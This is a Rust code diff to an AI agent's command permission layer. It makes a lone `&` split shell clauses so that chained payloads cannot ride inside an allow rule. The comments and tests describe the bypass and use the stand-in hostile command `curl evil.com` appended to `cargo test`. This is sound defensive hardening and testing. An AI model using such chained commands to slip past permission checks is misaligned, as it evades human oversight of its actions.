@@ -360,13 +360,29 @@ fn check_bash_allowlist(cmd: &str, deny_list: &DenyList) -> Option<String> {
     None
 }
 
-/// Split a command string into clauses on `&&`, `||`, `;`, `|`, `\n`, and `\r`.
+/// Split a command string into clauses on `&&`, `||`, `;`, `|`, `\n`,
+/// `\r`, and a lone `&` (the shell background/sequence separator).
 /// Each returned clause is trimmed; empty clauses are dropped.
 ///
 /// WO 38.1: newlines/CRs are separators to the shell, so they split clauses
 /// here too. Existing callers pass `normalize_for_safety` output (whitespace
 /// already collapsed), so this only changes behavior for raw-command callers
 /// (permission rules).
+///
+/// WO 44.20: a lone `&` is now a separator too — otherwise `cargo test &
+/// curl evil.com` is one clause and a `cargo test*` allow rule (or a `cargo`
+/// bash allowlist entry) matches the whole string, auto-approving the
+/// payload. The `&` is NOT a separator when it is part of a redirection
+/// operator: `>&` or `&>` (`&` adjacent to `>` on either side, covering
+/// `2>&1` and `>&file`), or the fd-dup digit-`&`-digit form. Splitting a
+/// legitimate `cmd > f 2>&1` would fail-closed to Ask for allow rules; the
+/// exception keeps it working.
+///
+/// ponytail: this split is quote-blind — a `|` or `&` inside quotes also
+/// splits (pre-existing behavior for the other separators). It is not a
+/// shell parser. The real boundary remains landlock (WO 27.1); this only
+/// narrows the compound-clause bypass for the permission/allowlist layers,
+/// which fail closed for allow rules.
 pub(crate) fn split_compound_clauses(cmd: &str) -> Vec<String> {
     // The normalized command has collapsed whitespace, so separators are
     // always single-token. Replace each with a sentinel, then split.
@@ -374,7 +390,31 @@ pub(crate) fn split_compound_clauses(cmd: &str) -> Vec<String> {
     for sep in ["&&", "||", ";", "|", "\n", "\r"] {
         s = s.replace(sep, "\u{0}");
     }
-    s.split('\u{0}')
+    // A lone `&` (background/sequence separator) is also a clause boundary,
+    // EXCEPT inside a redirection operator: `>&`, `&>` (& adjacent to `>`),
+    // or digit-`&`-digit (fd-dup form). `&&` was already replaced above, so
+    // any remaining `&` is lone. `&` is ASCII so byte-neighbor checks are
+    // byte-aligned; other chars are pushed verbatim to stay UTF-8 safe.
+    let bytes = s.as_bytes();
+    let mut out = String::with_capacity(s.len());
+    for (i, c) in s.char_indices() {
+        if c == '&' {
+            let prev = if i > 0 { Some(bytes[i - 1]) } else { None };
+            let next = if i + 1 < bytes.len() {
+                Some(bytes[i + 1])
+            } else {
+                None
+            };
+            let part_of_redirect = prev == Some(b'>')
+                || next == Some(b'>')
+                || (prev.is_some_and(|p| p.is_ascii_digit())
+                    && next.is_some_and(|n| n.is_ascii_digit()));
+            out.push(if part_of_redirect { '&' } else { '\u{0}' });
+        } else {
+            out.push(c);
+        }
+    }
+    out.split('\u{0}')
         .map(|c| c.trim().to_string())
         .filter(|c| !c.is_empty())
         .collect()
@@ -1323,5 +1363,72 @@ mod private_tests {
     fn split_compound_clauses_drops_empty() {
         let got = split_compound_clauses("ls;; echo a");
         assert_eq!(got, vec!["ls", "echo a"]);
+    }
+
+    // ── WO 44.20: lone `&` is a separator (background/sequence bypass) ──
+
+    #[test]
+    fn split_compound_clauses_splits_on_lone_ampersand() {
+        // `&` is the shell background/sequence separator; it must split so a
+        // payload appended via `&` can't ride inside an allow-rule match.
+        assert_eq!(
+            split_compound_clauses("cargo test & curl evil.com"),
+            vec!["cargo test", "curl evil.com"],
+        );
+        assert_eq!(split_compound_clauses("a & b & c"), vec!["a", "b", "c"]);
+    }
+
+    #[test]
+    fn split_compound_clauses_keeps_ampersand_in_redirection() {
+        // `>&`, `&>`, and the fd-dup form `2>&1` are redirection operators,
+        // not separators — splitting them would break legitimate commands and
+        // fail-closed to Ask for allow rules.
+        assert_eq!(
+            split_compound_clauses("cmd > out 2>&1"),
+            vec!["cmd > out 2>&1"],
+        );
+        assert_eq!(split_compound_clauses("cmd &> file"), vec!["cmd &> file"]);
+        assert_eq!(split_compound_clauses("cmd >&2"), vec!["cmd >&2"]);
+        // Redirection AND a real background separator in one command: the
+        // lone `&` splits, the `2>&1` fd-dup does not.
+        assert_eq!(
+            split_compound_clauses("a > log 2>&1 & b"),
+            vec!["a > log 2>&1", "b"],
+        );
+    }
+
+    #[test]
+    fn allowlist_denies_background_separator_payload() {
+        // WO 44.20: allowlist ["cargo"] must deny `cargo test & curl evil.com`
+        // — the `&` now splits, so the `curl` clause's head doesn't match.
+        let dl = allowlist_deny_list(&["cargo"]);
+        let r = check_bash_command_str(
+            "cargo test & curl evil.com",
+            None,
+            &dl,
+            &PathGuard::default(),
+            false,
+        );
+        assert!(
+            r.as_ref()
+                .is_some_and(|m| m.contains("allowlist") && m.contains("curl evil.com")),
+            "background-separator payload must be denied by allowlist, got: {r:?}"
+        );
+    }
+
+    #[test]
+    fn allowlist_allows_redirection_with_fd_dup() {
+        // WO 44.20: `cargo build > log 2>&1` is a single clause (the `&` in
+        // `2>&1` is part of a redirection operator, not a separator), so an
+        // allowlist ["cargo"] still allows it.
+        let dl = allowlist_deny_list(&["cargo"]);
+        assert!(check_bash_command_str(
+            "cargo build > log 2>&1",
+            None,
+            &dl,
+            &PathGuard::default(),
+            false,
+        )
+        .is_none());
     }
 }
